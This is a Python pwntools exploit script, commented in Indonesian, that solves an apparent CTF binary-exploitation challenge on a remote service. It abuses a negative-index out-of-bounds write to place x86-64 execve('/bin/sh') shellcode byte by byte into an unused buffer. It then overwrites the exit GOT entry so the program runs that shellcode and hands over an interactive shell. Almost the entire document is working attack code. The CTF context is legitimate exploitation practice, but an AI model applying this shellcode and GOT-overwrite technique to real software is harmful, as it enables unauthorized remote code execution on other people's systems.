"""
Program ini hanya mengecek nilai index jika lebih dari index array tapi tidak mengecek nilai negatif (Vuln Out of Bound).
Karena NX di-disable maka kita bisa memasukkan shellcode dan dieksekusi dengan ret ke address tersebut.
Yang kita bisa masukkan hanyalah index, namun ada bantuan untuk menyusun shellcode yaitu nilai acak tadi.
Karena counter diincrement per iterasi, kita bisa memanfaatkan variabel counter untuk menyesuaikan shellcode.
ada variabel nama yang tidak terpakai yang bisa dijadikan tempat meletakkan shellcode.
selanjutnya untuk mengeksekusi shellcode kita bisa mengganti GOT exit dengan address variabel nama.
"""

from pwn import *
import operator

# ubah sign val ke unsign
def unsign(x):
    if(x < 0):
        x += 0x100
    return x

r = remote("ctf.joints.id", 17077)

# index variabel
counter_inx = 0x40409c-0x4040e0
nama_inx = 0x4040a0-0x4040e0
exit_inx = 0x404048-0x4040e0

# shellcode
sh = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
shell = {}
for i in range(len(sh)):
    shell[i+nama_inx] = ord(sh[i])

# ubah GOT exit ke address shellcode (variabel nama)
shell[exit_inx] = 0xa0
shell[exit_inx+1] = 0x40

# mengurutkan dari nilai terkecil
shell = sorted(shell.items(), key=operator.itemgetter(1))
# print shell

# mendapatkan nilai acak untuk menyusun shellcode
r.recvuntil("Ke - 1\n")
num = r.recvline()[:-2].split(" ")
n = {}
for i in range(len(num)):
    n[i] = unsign(int(num[i]))

# mengurutkan dari nilai terkecil
n = sorted(n.items(), key=operator.itemgetter(1))
# print n

# Tujuan diurutkan agar meminimalkan jumlah iterasi
# Jika tidak diurut maka bisa jadi nilai acak index pertama lebih besar dari char shellcode pertama
# sehingga harus overflow variabel counter sekali (kembali ke nol) dan diincrement sampai 0x31

# Jika ternyata nilai acak terkecil lebih besar dari nilai shellcode terkecil, program exit
if(n[0][1] > shell[0][1]):
    exit()
n = n[0:len(shell)]

# nilai beda per char shellcode, digunakan untuk increment counter
diff = [shell[i][1]-n[i][1] for i in range(len(shell))]

for i in range(len(diff)):
    if(diff[i] == 0):
        r.sendlineafter(" : ", "{} {}".format(shell[i][0], n[i][0]))
    else:
        r.sendlineafter(" : ", "{} {}".format(counter_inx, n[i][0]))
        for _ in range(diff[i]-1):
            r.sendlineafter(" : ", '0 0')
        r.sendlineafter(" : ", "{} {}".format(shell[i][0], counter_inx))
    print i

# masukkan input yang > 99, untuk memanggil exit dan mengeksekusi shellcode
r.sendlineafter(" : ", '100 0')

r.interactive()
